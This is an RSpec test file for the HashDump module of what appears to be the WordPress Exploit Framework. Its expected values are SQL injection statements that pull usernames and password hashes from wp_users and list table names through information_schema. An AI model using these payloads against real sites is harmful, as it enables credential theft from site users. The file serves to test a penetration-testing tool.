# frozen_string_literal: true

require_relative '../spec_helper'

describe Wpxf::WordPress::HashDump do
  let(:subject) do
    Class.new(Wpxf::Module) do
      include Wpxf::WordPress::HashDump
    end.new
  end

  describe '#new' do
    it 'registers the export_path option' do
      expect(subject.get_option('export_path')).to_not be_nil
    end
  end

  describe '#export_path' do
    it 'returns the value of the export_path option' do
      subject.set_option_value('export_path', '/path/to/export')
      expect(subject.export_path).to eq '/path/to/export'
    end
  end

  describe '#hashdump_sql_statement' do
    context 'when #reveals_one_row_per_request is false' do
      it 'returns a select statement that will select all user hashes with no limit clause' do
        allow(subject).to receive(:reveals_one_row_per_request).and_return(false)
        allow(subject).to receive(:hashdump_number_of_cols).and_return(3)
        allow(subject).to receive(:hashdump_visible_field_index).and_return(1)
        allow(subject).to receive(:table_prefix).and_return('wp_')
        allow(subject).to receive(:bof_token).and_return(123)
        allow(subject).to receive(:eof_token).and_return(321)

        expected_query = 'select 0,concat(123,0x3a,user_login,0x3a,user_pass,0x3a,321),0 from wp_users'
        expect(subject.hashdump_sql_statement).to eq expected_query
      end
    end

    context 'when #reveals_one_row_per_request is true' do
      it 'returns a select statement that will select all user hashes with a limit clause' do
        allow(subject).to receive(:reveals_one_row_per_request).and_return(true)
        allow(subject).to receive(:hashdump_number_of_cols).and_return(3)
        allow(subject).to receive(:hashdump_visible_field_index).and_return(1)
        allow(subject).to receive(:table_prefix).and_return('wp_')
        allow(subject).to receive(:bof_token).and_return(123)
        allow(subject).to receive(:eof_token).and_return(321)
        allow(subject).to receive(:current_row).and_return(3)

        expected_query = 'select 0,concat(123,0x3a,user_login,0x3a,user_pass,0x3a,321),0 from wp_users limit 3,1'
        expect(subject.hashdump_sql_statement).to eq expected_query
      end
    end
  end

  describe '#hashdump_prefix_fingerprint_statement' do
    context 'when #reveals_one_row_per_request is false' do
      it 'returns a select statement that will select all table names in the current database' do
        allow(subject).to receive(:reveals_one_row_per_request).and_return(false)
        allow(subject).to receive(:hashdump_number_of_cols).and_return(3)
        allow(subject).to receive(:hashdump_visible_field_index).and_return(1)
        allow(subject).to receive(:bof_token).and_return(123)
        allow(subject).to receive(:eof_token).and_return(321)

        expected_query = 'select 0,concat(123,0x3a,table_name,0x3a,321),0 from information_schema.tables where table_schema = database()'
        expect(subject.hashdump_prefix_fingerprint_statement).to eq expected_query
      end
    end

    context 'when #reveals_one_row_per_request is true' do
      it 'returns a select statement that will select all table names in the current database with a limit clause' do
        allow(subject).to receive(:reveals_one_row_per_request).and_return(true)
        allow(subject).to receive(:hashdump_number_of_cols).and_return(3)
        allow(subject).to receive(:hashdump_visible_field_index).and_return(1)
        allow(subject).to receive(:bof_token).and_return(123)
        allow(subject).to receive(:eof_token).and_return(321)
        allow(subject).to receive(:current_row).and_return(3)

        expected_query = 'select 0,concat(123,0x3a,table_name,0x3a,321),0 from information_schema.tables where table_schema = database() limit 3,1'
        expect(subject.hashdump_prefix_fingerprint_statement).to eq expected_query
      end
    end
  end
end
